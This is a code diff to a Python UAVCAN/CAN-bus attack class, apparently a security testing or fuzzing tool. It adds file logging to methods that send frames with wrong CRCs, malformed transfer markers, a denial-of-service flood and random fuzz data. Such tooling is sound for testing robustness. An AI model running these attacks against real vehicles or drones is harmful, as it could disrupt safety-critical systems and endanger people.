@@ -10,7 +10,7 @@ import time
 
 
 class attack:
-    def __init__(self, bus, data, data_exclude, interval):
+    def __init__(self, bus, data, data_exclude, interval, output):
         self.AID        = UAVCAN_AID()
         self.bus        = bus
         self.interval   = interval
@@ -35,9 +35,22 @@ class attack:
                 else:
                     aids_else.discard(aid)
 
+        if output:
+            self.output = output
+            with open(self.output, 'w') as f:
+                f.write(str(time.strftime('%c\n', time.localtime(time.time()))))
+
         self.aids_service   = list(aids_service)
         self.aids_else      = list(aids_else)
 
+
+    def send_msg(self, msg):
+        if "output" in self.__dict__:
+            with open(self.output, 'a') as f:
+                f.write(str(msg) + '\n')
+        print(msg)
+        time.sleep(self.interval)
+        self.bus.send(msg)
 
     # send multiframe message with wrong CRC
     def wrong_CRC(self, CRC = 'AA AA', payload = 'BB BB BB BB', padding = True):
@@ -143,9 +156,7 @@ class attack:
                 extended_id  = True,
                 data            = bytearray.fromhex( ' '.join(payload + [ UAVCAN_PAYLOAD(transfer_end = 0b0).get_tail() ] ) )
             )
-            # print(msg)
-            self.bus.send(msg)
-            time.sleep(self.interval)
+            self.send_msg(msg)
             if counter != -1: counter -= 1
 
     def wrong_END_test(self):
@@ -172,8 +183,7 @@ class attack:
             extended_id  = True,
             data            = bytearray.fromhex( UAVCAN_PAYLOAD.random() + U_PAYLOAD.get_tail() )
         )
-        # print(msg)
-        self.bus.send(msg)
+        self.send_msg(msg)
 
         U_PAYLOAD.transfer_start = 0b0
         while counter:
@@ -183,9 +193,7 @@ class attack:
                 extended_id  = True,
                 data            = bytearray.fromhex( UAVCAN_PAYLOAD.random() + U_PAYLOAD.get_tail() )
             )
-            # print(msg)
-            self.bus.send(msg)
-            time.sleep(self.interval)
+            self.send_msg(msg)
             if counter != -1: counter -= 1
 
     def DoS(self, counter = -1):
@@ -204,8 +212,7 @@ class attack:
                     extended_id     = True, 
                     data            = b'\xc0'
                 )
-                self.bus.send(msg)
-                time.sleep(self.interval)
+                self.send_msg(msg)
                 if counter != -1: counter -= 1
 
     def Fuzz(self, counter = -1):
@@ -216,9 +223,7 @@ class attack:
                 data            = os.urandom(random.randint(0, 7)) + \
                                   bytearray.fromhex( UAVCAN_PAYLOAD(transfer_ID = random.randint(0, 2**5-1)).get_tail() )
             )
-            # print(msg)
-            self.bus.send(msg)
-            time.sleep(self.interval)
+            self.send_msg(msg)
             if counter != -1: counter -= 1
 
 
